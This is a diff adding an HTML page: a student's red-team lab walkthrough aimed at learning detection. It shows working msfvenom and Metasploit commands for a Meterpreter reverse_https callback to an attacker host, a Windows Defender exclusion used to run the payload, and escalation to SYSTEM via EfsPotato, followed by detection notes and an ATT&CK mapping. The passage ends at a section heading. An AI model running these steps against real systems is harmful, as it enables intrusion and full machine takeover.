@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Backdoor HTTPS Attack · reverse_https → SYSTEM · Sai Nikhith Atmakuri</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --void:#060912;
+    --void-2:#0a0f1c;
+    --panel:rgba(255,255,255,.035);
+    --panel-2:rgba(255,255,255,.055);
+    --hair:rgba(255,255,255,.09);
+    --hair-bright:rgba(255,255,255,.16);
+    --cyan:#2fe6ff;
+    --violet:#9b6bff;
+    --amber:#ffb74d;
+    --red:#ff5c7a;
+    --green:#4ade9b;
+    --ink:#eaf0fb;
+    --ink-dim:#9aa6bf;
+    --ink-faint:#5f6b85;
+    --display:'Space Grotesk',sans-serif;
+    --body:'IBM Plex Sans',sans-serif;
+    --mono:'JetBrains Mono',monospace;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{
+    background:var(--void);
+    color:var(--ink);
+    font-family:var(--body);
+    line-height:1.6;
+    overflow-x:hidden;
+    -webkit-font-smoothing:antialiased;
+  }
+  /* ambient glow field */
+  .atmosphere{position:fixed;inset:0;z-index:0;pointer-events:none;}
+  .atmosphere::before{content:"";position:absolute;top:-15%;left:-10%;width:55vw;height:55vw;
+    background:radial-gradient(circle,rgba(47,230,255,.10),transparent 62%);filter:blur(30px);}
+  .atmosphere::after{content:"";position:absolute;bottom:-20%;right:-10%;width:60vw;height:60vw;
+    background:radial-gradient(circle,rgba(155,107,255,.12),transparent 62%);filter:blur(30px);}
+  .grid-overlay{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.4;
+    background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+                    linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+    background-size:64px 64px;mask-image:radial-gradient(circle at 50% 30%,#000,transparent 80%);}
+  .wrap{position:relative;z-index:1;max-width:1100px;margin:0 auto;padding:0 24px;}
+
+  /* ---------- nav ---------- */
+  nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(18px) saturate(140%);
+    background:linear-gradient(180deg,rgba(6,9,18,.85),rgba(6,9,18,.55));
+    border-bottom:1px solid var(--hair);}
+  .nav-inner{max-width:1100px;margin:0 auto;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
+  .brand{font-family:var(--mono);font-size:14px;font-weight:700;letter-spacing:.04em;color:var(--ink);display:flex;align-items:center;gap:9px;}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);animation:pulse 2.4s infinite;}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+  .nav-links{display:flex;gap:22px;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;}
+  .nav-links span{color:var(--ink-dim);transition:color .2s;cursor:default;}
+  .nav-links span:hover{color:var(--cyan);}
+  @media(max-width:760px){.nav-links{display:none}}
+
+  /* ---------- hero ---------- */
+  header.hero{padding:78px 0 40px;}
+  .eyebrow{font-family:var(--mono);font-size:12.5px;letter-spacing:.22em;text-transform:uppercase;
+    color:var(--cyan);display:inline-flex;align-items:center;gap:10px;margin-bottom:22px;}
+  .codename{font-family:var(--display);font-weight:700;font-size:13px;letter-spacing:.34em;
+    text-transform:uppercase;margin-bottom:16px;display:inline-flex;align-items:center;gap:12px;flex-wrap:wrap;
+    background:linear-gradient(110deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .codename::before,.codename::after{content:"";width:18px;height:1px;background:linear-gradient(90deg,var(--violet),transparent);opacity:.6;}
+  .codename::before{background:linear-gradient(90deg,transparent,var(--cyan));}
+  .eyebrow::before{content:"";width:30px;height:1px;background:linear-gradient(90deg,var(--cyan),transparent);}
+  h1{font-family:var(--display);font-weight:700;font-size:clamp(34px,6vw,62px);line-height:1.02;letter-spacing:-.02em;}
+  h1 .grad{background:linear-gradient(110deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .sub{margin-top:22px;max-width:660px;font-size:17px;color:var(--ink-dim);}
+  .meta-row{margin-top:30px;display:flex;flex-wrap:wrap;gap:10px;font-family:var(--mono);font-size:12px;}
+  .chip{padding:7px 13px;border:1px solid var(--hair);border-radius:100px;background:var(--panel);
+    color:var(--ink-dim);display:inline-flex;align-items:center;gap:7px;}
+  .chip b{color:var(--ink);font-weight:600;}
+  .chip .swatch{width:7px;height:7px;border-radius:50%;}
+
+  /* ---------- kill chain signature ---------- */
+  .chain-stage{margin:54px 0 10px;}
+  .chain-wrap{position:relative;border:1px solid var(--hair);border-radius:20px;padding:30px 24px 24px;
+    background:linear-gradient(180deg,var(--panel-2),rgba(255,255,255,.012));overflow:hidden;
+    box-shadow:0 1px 0 rgba(255,255,255,.06) inset, 0 30px 80px -40px rgba(47,230,255,.25);}
+  .chain-label{font-family:var(--mono);font-size:11.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--ink-faint);margin-bottom:6px;}
+  .chain-svg{width:100%;height:118px;display:block;}
+  .node-row{display:flex;justify-content:space-between;margin-top:4px;gap:6px;}
+  .node{flex:1;text-align:center;cursor:default;transition:transform .25s;}
+  .node:hover{transform:translateY(-3px);}
+  .node .ico{width:46px;height:46px;margin:0 auto 9px;border-radius:13px;display:grid;place-items:center;
+    border:1px solid var(--hair-bright);background:linear-gradient(160deg,rgba(255,255,255,.08),rgba(255,255,255,.02));
+    font-family:var(--mono);font-weight:700;font-size:15px;color:var(--cyan);position:relative;
+    box-shadow:0 6px 18px -8px rgba(0,0,0,.6), 0 0 0 0 rgba(47,230,255,.5);transition:box-shadow .3s,border-color .3s;}
+  .node:hover .ico{border-color:var(--cyan);box-shadow:0 0 22px -2px rgba(47,230,255,.55);}
+  .node:nth-child(5) .ico{color:var(--red);}
+  .node:nth-child(5):hover .ico{border-color:var(--red);box-shadow:0 0 22px -2px rgba(255,92,122,.55);}
+  .node .nm{font-family:var(--mono);font-size:11px;letter-spacing:.04em;color:var(--ink);font-weight:600;}
+  .node .tag{font-size:10.5px;color:var(--ink-faint);font-family:var(--mono);margin-top:2px;}
+
+  /* ---------- sections ---------- */
+  section{padding:62px 0;}
+  .sec-head{margin-bottom:34px;}
+  .sec-num{font-family:var(--mono);font-size:12.5px;color:var(--violet);letter-spacing:.18em;}
+  h2{font-family:var(--display);font-weight:600;font-size:clamp(25px,3.6vw,36px);letter-spacing:-.015em;margin-top:8px;}
+  .lead{color:var(--ink-dim);max-width:680px;margin-top:14px;font-size:16.5px;}
+
+  .prose p{color:var(--ink-dim);margin-bottom:18px;font-size:16px;}
+  .prose p strong{color:var(--ink);font-weight:600;}
+  .prose .accent{color:var(--cyan);font-weight:600;}
+
+  /* glass card */
+  .card{border:1px solid var(--hair);border-radius:16px;padding:24px;
+    background:linear-gradient(180deg,var(--panel-2),rgba(255,255,255,.012));
+    box-shadow:0 1px 0 rgba(255,255,255,.05) inset;position:relative;overflow:hidden;}
+  .card::before{content:"";position:absolute;top:0;left:0;right:0;height:1px;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);}
+
+  /* step blocks */
+  .step{display:grid;grid-template-columns:64px 1fr;gap:22px;margin-bottom:14px;}
+  .step-rail{position:relative;}
+  .step-no{width:46px;height:46px;border-radius:13px;display:grid;place-items:center;
+    font-family:var(--mono);font-weight:700;font-size:16px;color:var(--void);
+    background:linear-gradient(150deg,var(--cyan),var(--violet));box-shadow:0 8px 22px -8px rgba(47,230,255,.6);}
+  .step-line{position:absolute;left:23px;top:54px;bottom:-14px;width:1px;background:linear-gradient(var(--hair-bright),transparent);}
+  .step:last-child .step-line{display:none}
+  .step-body h3{font-family:var(--display);font-size:20px;font-weight:600;margin-bottom:4px;}
+  .step-body .where{font-family:var(--mono);font-size:11.5px;color:var(--ink-faint);letter-spacing:.05em;margin-bottom:14px;}
+  .step-body p{color:var(--ink-dim);font-size:15.5px;margin-bottom:14px;}
+  @media(max-width:620px){.step{grid-template-columns:48px 1fr;gap:16px}.step-line{left:23px}}
+
+  /* terminal */
+  .term{border:1px solid var(--hair);border-radius:14px;overflow:hidden;background:rgba(2,5,12,.7);
+    box-shadow:0 26px 60px -34px rgba(0,0,0,.9);margin:14px 0 6px;}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:11px 14px;border-bottom:1px solid var(--hair);
+    background:linear-gradient(180deg,rgba(255,255,255,.04),transparent);}
+  .term-bar .b{width:11px;height:11px;border-radius:50%;}
+  .b.r{background:#ff5f57}.b.y{background:#febc2e}.b.g{background:#28c840}
+  .term-bar .t{margin-left:8px;font-family:var(--mono);font-size:11.5px;color:var(--ink-faint);}
+  .term-body{padding:16px 18px;font-family:var(--mono);font-size:13px;line-height:1.85;overflow-x:auto;}
+  .term-body .pr{color:var(--green);}
+  .term-body .pr2{color:var(--violet);}
+  .term-body .cmd{color:var(--ink);}
+  .term-body .flag{color:var(--cyan);}
+  .term-body .out{color:var(--ink-dim);}
+  .term-body .ok{color:var(--green);}
+  .term-body .warn{color:var(--amber);}
+  .term-body .crit{color:var(--red);font-weight:700;}
+  .term-body .comment{color:var(--ink-faint);font-style:italic;}
+
+  /* takeaway callout */
+  .takeaway{border-left:2px solid var(--cyan);padding:16px 20px;margin:18px 0 4px;border-radius:0 12px 12px 0;
+    background:linear-gradient(90deg,rgba(47,230,255,.07),transparent);}
+  .takeaway .k{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--cyan);margin-bottom:6px;}
+  .takeaway p{color:var(--ink);font-size:15px;margin:0;}
+  .takeaway.amber{border-color:var(--amber);background:linear-gradient(90deg,rgba(255,183,77,.08),transparent);}
+  .takeaway.amber .k{color:var(--amber);}
+
+  /* stats */
+  .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:6px;}
+  .stat{border:1px solid var(--hair);border-radius:14px;padding:20px;background:var(--panel);text-align:left;
+    box-shadow:0 1px 0 rgba(255,255,255,.05) inset;}
+  .stat .v{font-family:var(--display);font-weight:700;font-size:30px;
+    background:linear-gradient(120deg,var(--cyan),var(--violet));-webkit-background-clip:text;background-clip:text;color:transparent;}
+  .stat .l{font-family:var(--mono);font-size:11px;color:var(--ink-dim);letter-spacing:.05em;margin-top:4px;}
+  @media(max-width:680px){.stats{grid-template-columns:repeat(2,1fr)}}
+
+  /* tabs (attack/defense) */
+  .tabs{display:inline-flex;border:1px solid var(--hair);border-radius:100px;padding:4px;background:var(--panel);margin-bottom:26px;}
+  .tab{font-family:var(--mono);font-size:12.5px;padding:8px 18px;border-radius:100px;cursor:pointer;color:var(--ink-dim);border:none;background:none;transition:.25s;letter-spacing:.03em;}
+  .tab.on{color:var(--void);background:linear-gradient(120deg,var(--cyan),var(--violet));font-weight:600;}
+  .pane{display:none;animation:fade .4s ease;}
+  .pane.on{display:block;}
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+  /* mitre matrix */
+  .mitre{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:12px;}
+  .tech{border:1px solid var(--hair);border-radius:13px;padding:15px;background:var(--panel);transition:.25s;position:relative;overflow:hidden;}
+  .tech:hover{border-color:var(--hair-bright);transform:translateY(-3px);background:var(--panel-2);}
+  .tech .id{font-family:var(--mono);font-size:12px;color:var(--cyan);font-weight:700;}
+  .tech .tac{font-family:var(--mono);font-size:9.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink-faint);margin:7px 0 4px;}
+  .tech .nm{font-size:13.5px;color:var(--ink);font-weight:500;line-height:1.3;}
+  .tech.crit .id{color:var(--red);}
+
+  /* detection rows */
+  .det{display:grid;grid-template-columns:140px 1fr;gap:18px;padding:16px 0;border-bottom:1px solid var(--hair);}
+  .det:last-child{border-bottom:none;}
+  .det .layer{font-family:var(--mono);font-size:12px;color:var(--amber);font-weight:600;letter-spacing:.04em;padding-top:2px;}
+  .det .what{color:var(--ink-dim);font-size:15px;}
+  .det .what b{color:var(--ink);}
+  @media(max-width:620px){.det{grid-template-columns:1fr;gap:6px}}
+
+  /* footer */
+  footer{border-top:1px solid var(--hair);margin-top:30px;padding:50px 0 70px;}
+  .foot-grid{display:flex;flex-wrap:wrap;justify-content:space-between;gap:26px;align-items:flex-end;}
+  .foot-name{font-family:var(--display);font-weight:600;font-size:21px;}
+  .foot-role{color:var(--ink-dim);font-size:14px;margin-top:4px;}
+  .foot-links{display:flex;gap:14px;font-family:var(--mono);font-size:13px;}
+  .foot-links a{color:var(--ink-dim);text-decoration:none;padding:9px 15px;border:1px solid var(--hair);border-radius:100px;transition:.25s;background:var(--panel);}
+  .foot-links a:hover{color:var(--cyan);border-color:var(--cyan);}
+  .disclaimer{margin-top:34px;font-size:12.5px;color:var(--ink-faint);font-family:var(--mono);line-height:1.7;
+    border:1px dashed var(--hair);border-radius:12px;padding:16px 18px;background:rgba(255,92,122,.03);}
+  .disclaimer b{color:var(--red);}
+
+  /* reveal */
+  .reveal{opacity:0;transform:translateY(26px);transition:opacity .7s cubic-bezier(.2,.7,.2,1),transform .7s cubic-bezier(.2,.7,.2,1);}
+  .reveal.in{opacity:1;transform:none;}
+
+  @media(prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important;}
+    .reveal{opacity:1;transform:none;}
+    html{scroll-behavior:auto;}
+  }
+  ::selection{background:rgba(47,230,255,.3);color:#fff;}
+</style>
+</head>
+<body>
+<div class="atmosphere"></div>
+<div class="grid-overlay"></div>
+
+<nav>
+  <div class="nav-inner">
+    <div class="brand"><span class="dot"></span>nikhith-ni7 / backdoor-https-attack</div>
+    <div class="nav-links">
+      <span>Why</span>
+      <span>Attack chain</span>
+      <span>Escalation</span>
+      <span>Detection</span>
+      <span>Real-world use</span>
+    </div>
+  </div>
+</nav>
+
+<header class="hero wrap">
+  <div class="codename">BACKDOOR&nbsp;HTTPS&nbsp;ATTACK</div>
+  <div class="eyebrow">Offensive Security · Red-Team Walkthrough</div>
+  <h1>I built a Windows backdoor<br>so I could learn to <span class="grad">catch one.</span></h1>
+  <p class="sub">A full red-team chain run end to end in an isolated VM lab — from generating a Meterpreter <span style="font-family:var(--mono);color:var(--cyan)">reverse_https</span> payload to landing a session and escalating to <span style="font-family:var(--mono);color:var(--red)">NT AUTHORITY\SYSTEM</span>. This page is the honest write-up: what I did, where I got stuck, and how building the attack changed the way I'd defend against it from a SOC seat.</p>
+  <div class="meta-row">
+    <span class="chip"><span class="swatch" style="background:var(--cyan)"></span>Kali Linux · VMware</span>
+    <span class="chip"><span class="swatch" style="background:var(--violet)"></span>Windows 11 target</span>
+    <span class="chip"><b>Metasploit</b> · msfvenom</span>
+    <span class="chip"><span class="swatch" style="background:var(--red)"></span>Privilege escalation</span>
+    <span class="chip">MITRE ATT&CK mapped</span>
+  </div>
+
+  <!-- SIGNATURE: animated kill chain -->
+  <div class="chain-stage reveal">
+    <div class="chain-wrap">
+      <div class="chain-label">// live attack path — beacon traversal</div>
+      <svg class="chain-svg" viewBox="0 0 1000 118" preserveAspectRatio="none" aria-hidden="true">
+        <defs>
+          <linearGradient id="flow" x1="0" y1="0" x2="1000" y2="0" gradientUnits="userSpaceOnUse">
+            <stop offset="0" stop-color="#2fe6ff"/>
+            <stop offset="1" stop-color="#9b6bff"/>
+          </linearGradient>
+          <filter id="glow"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+        </defs>
+        <path id="track" d="M70,59 L270,59 L450,59 L630,59 L930,59" fill="none" stroke="rgba(255,255,255,.1)" stroke-width="2"/>
+        <path id="track-lit" d="M70,59 L270,59 L450,59 L630,59 L930,59" fill="none" stroke="url(#flow)" stroke-width="2.5" stroke-dasharray="14 1100" filter="url(#glow)">
+          <animate attributeName="stroke-dashoffset" from="0" to="-1114" dur="4.5s" repeatCount="indefinite"/>
+        </path>
+        <circle r="6" fill="#fff" filter="url(#glow)">
+          <animateMotion dur="4.5s" repeatCount="indefinite" rotate="auto">
+            <mpath href="#track"/>
+          </animateMotion>
+        </circle>
+        <circle cx="70" cy="59" r="5" fill="#2fe6ff"/>
+        <circle cx="270" cy="59" r="5" fill="#5ec9ff"/>
+        <circle cx="450" cy="59" r="5" fill="#8a9cff"/>
+        <circle cx="630" cy="59" r="5" fill="#9b6bff"/>
+        <circle cx="930" cy="59" r="6" fill="#ff5c7a"/>
+      </svg>
+      <div class="node-row">
+        <div class="node"><div class="ico">01</div><div class="nm">GENERATE</div><div class="tag">msfvenom</div></div>
+        <div class="node"><div class="ico">02</div><div class="nm">DELIVER</div><div class="tag">Apache stage</div></div>
+        <div class="node"><div class="ico">03</div><div class="nm">EXECUTE</div><div class="tag">on target</div></div>
+        <div class="node"><div class="ico">04</div><div class="nm">CALLBACK</div><div class="tag">HTTPS C2</div></div>
+        <div class="node"><div class="ico">05</div><div class="nm">SYSTEM</div><div class="tag">EfsPotato</div></div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- WHY -->
+<section id="story" class="wrap">
+  <div class="sec-head reveal">
+    <div class="sec-num">// 00 — the point of all this</div>
+    <h2>Why I built the attack first</h2>
+    <p class="lead">Most people studying for SOC roles learn detection from the outside in — they read what an alert <em>should</em> look like. I wanted the opposite. If I'm going to recognise a Meterpreter callback in a sea of logs, I want to have been the one who fired it.</p>
+  </div>
+  <div class="prose reveal">
+    <p>I ran this on my own gear — a Kali attacker and a Windows 11 target, both VMs on an isolated VMware network with no route to my real home LAN. The goal wasn't to "hack a machine." I already know the commands exist. The goal was to <strong>sit on both sides of the same event</strong>: pull off a believable intrusion, then turn around and ask what trace it left behind for a defender to find.</p>
+    <p>I picked <span class="accent">windows/meterpreter/reverse_https</span> on purpose. It's not the loudest payload — it's the <em>quiet</em> one. The callback rides over TLS so the traffic looks like ordinary encrypted web browsing, and it beacons back to the attacker rather than holding an obvious open connection. That's exactly why it's worth understanding: a defender can't read the payload inside the TLS, so they have to catch it on <strong>behaviour</strong> instead. Building it taught me what that behaviour actually is.</p>
+  </div>
+  <div class="stats reveal" style="margin-top:30px">
+    <div class="stat"><div class="v" data-to="5">0</div><div class="l">stages, gen → SYSTEM</div></div>
+    <div class="stat"><div class="v" data-to="665">0</div><div class="l">byte payload</div></div>
+    <div class="stat"><div class="v" data-to="8080" data-plain="1">0</div><div class="l">C2 port (HTTPS)</div></div>
+    <div class="stat"><div class="v" data-suffix="" data-text="SYSTEM">—</div><div class="l">privilege reached</div></div>
+  </div>
+</section>
+
+<!-- ATTACK CHAIN -->
+<section id="chain" class="wrap">
+  <div class="sec-head reveal">
+    <div class="sec-num">// 01 — execution</div>
+    <h2>The chain, step by step</h2>
+    <p class="lead">Each step below is what I actually ran and what actually happened — including the parts that didn't go smoothly. The terminals are the real commands.</p>
+  </div>
+
+  <!-- step 1 -->
+  <div class="step reveal">
+    <div class="step-rail"><div class="step-no">1</div><div class="step-line"></div></div>
+    <div class="step-body">
+      <h3>Generate the payload</h3>
+      <div class="where">// kali · msfvenom</div>
+      <p>I started by building the malicious executable. The first time, I ran <span style="font-family:var(--mono);color:var(--cyan)">msfvenom</span> without telling it a format or an output file — and it dumped 575 bytes of raw shellcode straight to my terminal as garbled characters. That was a useful mistake: it made the difference between <strong>the payload</strong> and <strong>its container</strong> click for me. The shellcode is the same bytes either way; the <span class="accent">-f exe</span> flag just wraps them in a Windows PE structure with a loader stub so a double-click will actually run them.</p>
+      <div class="term">
+        <div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">root@kali: ~</span></div>
+        <div class="term-body">
+<span class="pr">root@kali</span>:<span class="pr2">~#</span> <span class="cmd">msfvenom --payload windows/meterpreter/reverse_https \</span><br>
+&nbsp;&nbsp;<span class="flag">LHOST</span>=192.168.81.128 <span class="flag">LPORT</span>=8080 <span class="flag">--format</span> exe <span class="flag">--out</span> rev_https_8080.exe<br>
+<span class="out">[-] No platform was selected, choosing Msf::Module::Platform::Windows</span><br>
+<span class="out">[-] No arch selected, selecting arch: x86 from the payload</span><br>
+<span class="out">Payload size: 665 bytes</span><br>
+<span class="ok">Saved as: rev_https_8080.exe  (73,802 bytes)</span>
+        </div>
+      </div>
+      <div class="takeaway"><div class="k">What I took away</div><p>An <span style="font-family:var(--mono)">.exe</span> isn't "more dangerous" than raw shellcode — it's just packaged to be runnable. Understanding that container/payload split is what lets you reason about <em>other</em> delivery formats (DLL, macro, script) later.</p></div>
+    </div>
+  </div>
+
+  <!-- step 2 -->
+  <div class="step reveal">
+    <div class="step-rail"><div class="step-no">2</div><div class="step-line"></div></div>
+    <div class="step-body">
+      <h3>Stand up the listener, then stage the file</h3>
+      <div class="where">// kali · msfconsole + apache</div>
+      <p>A payload is useless without something to catch its call home. I set up a <span class="accent">multi/handler</span> with the <em>exact same</em> payload baked into the exe — that match matters; mismatch it and the callback never completes. Then I served the file over a plain Apache server so the target could grab it. Worth noting there are <strong>two separate channels</strong> here: HTTP on port 80 just to download the file, and HTTPS on 8080 for the actual command-and-control. Confusing those two cost me a minute early on.</p>
+      <div class="term">
+        <div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">msf6 exploit(multi/handler)</span></div>
+        <div class="term-body">
+<span class="pr2">msf6</span> <span class="cmd">use exploit/multi/handler</span><br>
+<span class="pr2">msf6</span> <span class="cmd">set PAYLOAD windows/meterpreter/reverse_https</span><br>
+<span class="pr2">msf6</span> <span class="cmd">set LHOST 192.168.81.128</span> &nbsp; <span class="cmd">set LPORT 8080</span><br>
+<span class="pr2">msf6</span> <span class="cmd">exploit</span><br>
+<span class="ok">[*] Started HTTPS reverse handler on https://192.168.81.128:8080</span>
+        </div>
+      </div>
+      <div class="takeaway"><div class="k">What I took away</div><p>The handler payload has to mirror the implant's payload. That tiny detail is the whole reason a defender can sometimes <em>predict</em> where a beacon is going just by reading the binary.</p></div>
+    </div>
+  </div>
+
+  <!-- step 3 -->
+  <div class="step reveal">
+    <div class="step-rail"><div class="step-no">3</div><div class="step-line"></div></div>
+    <div class="step-body">
+      <h3>Get past Windows Defender</h3>
+      <div class="where">// windows target · the real wall</div>
+      <p>This is where the lab stopped being a script. An unencoded Meterpreter payload is <em>trivially</em> caught by signature-based AV, so Defender flagged and removed the exe the moment it tried to land on disk. Instead of fighting the protection toggles, I went into the <strong>Virus &amp; threat protection settings</strong> and used the option near the bottom — <span class="accent">Add or remove exclusions</span> — to tell Defender to ignore one specific folder.</p>
+      <p>Then I downloaded <span style="font-family:var(--mono);color:var(--cyan)">rev_https_8080.exe</span> into that excluded folder and ran it from there. Because Defender was set to skip that location, the payload executed untouched and the session <strong>called straight back to my Kali machine</strong>. That detail reframed the whole thing for me: real intruders rarely "turn off the antivirus" wholesale — they carve out a narrow exception and operate inside it, leaving protection on everywhere else.</p>
+      <div class="takeaway amber"><div class="k">The lesson that stuck</div><p>Adding a Defender exclusion is a <em>loud</em> event, not a quiet one. The exception itself is a high-fidelity signal a defender can hunt for. Having created one to slip my payload through, I now read "new exclusion added" or "protected folder carved out" in a log as exactly the move it is.</p></div>
+    </div>
+  </div>
+
+  <!-- step 4 -->
+  <div class="step reveal">
+    <div class="step-rail"><div class="step-no">4</div><div class="step-line"></div></div>
+    <div class="step-body">
+      <h3>Execution and the callback</h3>
+      <div class="where">// windows → kali · C2 loop closes</div>
+      <p>With the exclusion in place I ran the file, flipped back to msfconsole, and watched the session open. This is the payoff moment — the target reaching back out to me over "HTTPS." <span class="accent">sysinfo</span> confirmed the box.</p>
+      <div class="term">
+        <div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">meterpreter</span></div>
+        <div class="term-body">
+<span class="ok">[*] Meterpreter session 1 opened (192.168.81.128:8080 -> 192.168.81.129:56923)</span><br>
+<span class="pr2">meterpreter</span> <span class="cmd">sysinfo</span><br>
+<span class="out">Computer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: DESKTOP-ORNJI5L</span><br>
+<span class="out">OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: Windows 11 (10.0 Build 23526)</span><br>
+<span class="out">Architecture&nbsp;: x64</span><br>
+<span class="warn">Meterpreter&nbsp;&nbsp;: x86/windows&nbsp;&nbsp;← 32-bit session on a 64-bit host</span>
+        </div>
+      </div>
+      <p>Then the session got flaky — commands started timing out. That wasn't a dead connection; it was the <strong>x86 payload running inside a 32-bit (WOW64) process on a 64-bit machine</strong>, which is fragile. The honest fix is to migrate into a native 64-bit process. That's a real piece of tradecraft I only understood because I hit the symptom myself: operators migrate immediately <em>because</em> the original payload process is unstable and easy to kill.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ESCALATION -->
+<section id="escalation" class="wrap">
+  <div class="sec-head reveal">
+    <div class="sec-num">// 02 — privilege escalation</div>
+    <h2>From a user to SYSTEM</h2>
+    <p class="lead">Landing a session gets you in. It doesn't get you control. The last move was climbing from my initial user context to the highest privilege the machine has.</p>
+  </div>
+  <div class="prose reveal">
+    <p>I ran <span class="accent">getsystem</span>, and it succeeded via <strong>EfsPotato</strong> — one of the "Potato" family of attacks. In plain terms: it abuses Windows' EFSRPC interface to <em>coerce the system into authenticating over a named pipe</em>, captures that SYSTEM token, and impersonates it. The result is a jump straight to <span style="font-family:var(--mono);color:var(--red)">NT AUTHORITY\SYSTEM</span> without needing a password.</p>
+  </div>
+  <div class="term reveal">
+    <div class="term-bar"><span class="b r"></span><span class="b y"></span><span class="b g"></span><span class="t">meterpreter · escalation</span></div>
+    <div class="term-body">
+<span class="pr2">meterpreter</span> <span class="cmd">getsystem</span><br>
+<span class="crit">...got system via technique 6 (Named Pipe Impersonation — EFSRPC variant, AKA EfsPotato).</span>
+    </div>
+  </div>
+  <div class="takeaway reveal"><div class="k">Why this matters more than the win</div><p>The fact that EfsPotato worked tells me something about the <em>target's patch level</em> — Microsoft has closed several Potato variants over time. So "the exploit succeeded" isn't bragging; it's a finding. In a real assessment that line is a patch-management recommendation, not a trophy.</p></div>
+</section>
+
+<!-- DEFENSE / DETECTION -->
+<section id="defense" class="wrap">
+  <div class="sec-head reveal">
+    <div class="sec-num">// 03 — the other side of the screen</div>
+    <h2>What this looks like to a defender</h2>
+    <p class="lead">This is the section that actually matters for the job I want. Having run the attack, here's the trail I'd be hunting for from a SOC console.</p>
+  </div>
+
+  <div class="reveal">
+    <div class="tabs">
+      <button class="tab on" data-pane="atk">Attacker's view</button>
+      <button class="tab" data-pane="def">Defender's view</button>
+    </div>
+
+    <div class="pane on" id="atk">
+      <div class="card">
+        <p style="color:var(--ink-dim);font-size:15.5px;margin:0">From my side it was clean: generate, stage, detonate, beacon home over TLS, escalate. Encrypted C2 over a web-looking port, an AV exclusion to slip the payload through, and a tokens-not-passwords climb to SYSTEM. Quiet by design — almost nothing here screams "malware" if you're only looking at content.</p>
+      </div>
+    </div>
+
+    <div class="pane" id="def">
+      <div class="det"><div class="layer">ENDPOINT</div><div class="what">An <b>unsigned ~72&nbsp;KB executable</b> writes to disk and immediately makes outbound network calls — a process that has no business talking to the internet suddenly does. Process-creation events (Security 4688 / Sysmon 1) tie the binary to its children.</div></div>
+      <div class="det"><div class="layer">DEFENSE EVASION</div><div class="what">A <b>new Defender exclusion</b> appears and/or real-time protection drops. That state change is itself a high-fidelity alert — defenders watch for exactly this.</div></div>
+      <div class="det"><div class="layer">NETWORK</div><div class="what"><b>Periodic beaconing</b> to <span style="font-family:var(--mono);color:var(--cyan)">:8080</span> over TLS — regular, low-jitter callbacks to a non-standard HTTPS port. You can't read the payload, but the <em>rhythm</em> gives it away.</div></div>
+      <div class="det"><div class="layer">ESCALATION</div><div class="what">The <b>EfsPotato</b> climb leaves named-pipe artifacts (Sysmon 17/18) and an EFSRPC/<span style="font-family:var(--mono)">lsarpc</span> footprint — a process suddenly wielding a SYSTEM token it shouldn't have.</div></div>
+    </div>
+  </div>
+
+  <div class="sec-head reveal" style="margin-top:48px">
+    <div class="sec-num">// MITRE ATT&CK</div>
+    <h2 style="font-size:24px">Techniques exercised</h2>
+  </div>
+  <div class="mitre reveal">
+    <div class="tech"><div class="id">T1059</div><div class="tac">Execution</div><div class="nm">Command & Scripting Interpreter</div></div>
+    <div class="tech"><div class="id">T1105</div><div class="tac">Command & Control</div><div class="nm">Ingress Tool Transfer</div></div>
+    <div class="tech"><div class="id">T1071.001</div><div class="tac">Command & Control</div><div class="nm">Web Protocols (HTTPS C2)</div></div>
+    <div class="tech"><div class="id">T1573.002</div><div class="tac">Command & Control</div><div class="nm">Encrypted Channel · TLS</div></div>
+    <div class="tech"><div class="id">T1571</div><div class="tac">Command & Control</div><div class="nm">Non-Standard Port (8080)</div></div>
+    <div class="tech crit"><div class="id">T1134</div><div class="tac">Priv. Escalation</div><div class="nm">Access Token Manipulation</div></div>
+    <div class="tech crit"><div class="id">T1068</div><div class="tac">Priv. Escalation</div><div class="nm">Exploitation for Priv-Esc · EfsPotato</div></div>
+    <div class="tech"><div class="id">T1055</div><div class="tac">Defense Evasion</div><div class="nm">Process Injection · migrate</div></div>
+  </div>
+</section>
+
+<!-- TAKEAWAY / REAL-WORLD -->
+<section id="takeaway" class="wrap">
+  <div class="sec-head reveal">
+    <div class="sec-num">// 04 — how I'll use this for real</div>
